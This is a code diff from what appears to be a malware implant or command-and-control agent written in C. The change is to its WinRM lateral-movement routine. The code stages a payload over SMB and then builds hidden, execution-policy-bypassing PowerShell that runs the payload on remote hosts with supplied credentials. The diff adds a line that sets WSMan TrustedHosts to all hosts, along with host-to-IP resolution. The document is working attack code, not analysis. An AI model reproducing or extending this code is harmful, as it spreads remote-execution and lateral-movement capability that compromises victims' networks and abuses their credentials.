@@ -2483,20 +2483,26 @@ void dispatch_task(AgentTask *task) {
             free(payload_data);
             if (!remote_path_wrm) { smb_stage_cleanup(lat_host,lat_user); agent_send_result(task->id,"","winrm: SMB staging failed"); return; }
 
-            char ps_wrm[2048];
+            char ps_wrm[4096];
             if (lat_user[0] && lat_pass[0]) {
                 snprintf(ps_wrm, sizeof(ps_wrm),
                     "powershell -NoP -W Hidden -Exec Bypass -C \""
+                    "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force -EA SilentlyContinue;"
+                    "try{$ip=[System.Net.Dns]::GetHostAddresses('%s')[0].IPAddressToString}"
+                    "catch{$ip='%s'};"
                     "$c=New-Object PSCredential('%s',(ConvertTo-SecureString '%s' -AsPlainText -Force));"
-                    "Invoke-Command -ComputerName '%s' -Credential $c "
+                    "Invoke-Command -ComputerName $ip -Credential $c "
                     "-ScriptBlock {Start-Process '%s' -WindowStyle Hidden}\"",
-                    lat_user, lat_pass, lat_host, remote_path_wrm);
+                    lat_host, lat_host, lat_user, lat_pass, remote_path_wrm);
             } else {
                 snprintf(ps_wrm, sizeof(ps_wrm),
                     "powershell -NoP -W Hidden -Exec Bypass -C \""
-                    "Invoke-Command -ComputerName '%s' "
+                    "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force -EA SilentlyContinue;"
+                    "try{$ip=[System.Net.Dns]::GetHostAddresses('%s')[0].IPAddressToString}"
+                    "catch{$ip='%s'};"
+                    "Invoke-Command -ComputerName $ip "
                     "-ScriptBlock {Start-Process '%s' -WindowStyle Hidden}\"",
-                    lat_host, remote_path_wrm);
+                    lat_host, lat_host, remote_path_wrm);
             }
             char *winrm_out = run_shell(ps_wrm);
             smb_stage_cleanup(lat_host, lat_user);
